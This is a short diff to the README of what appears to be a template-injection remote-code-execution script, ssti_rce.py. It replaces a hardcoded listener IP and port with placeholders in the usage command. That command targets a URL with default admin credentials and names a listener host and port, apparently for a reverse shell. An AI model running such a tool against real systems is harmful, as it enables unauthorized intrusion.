@@ -26,7 +26,7 @@ The script automates the following steps:
 ## 🚀 Usage
 
 ```bash
-python3 ssti_rce.py -url http://TARGET -lhost 10.10.14.8 -lport 4444 --username admin --password password
+python3 ssti_rce.py -url http://TARGET -lhost $ip -lport $port --username admin --password password
 ```
 ---
 
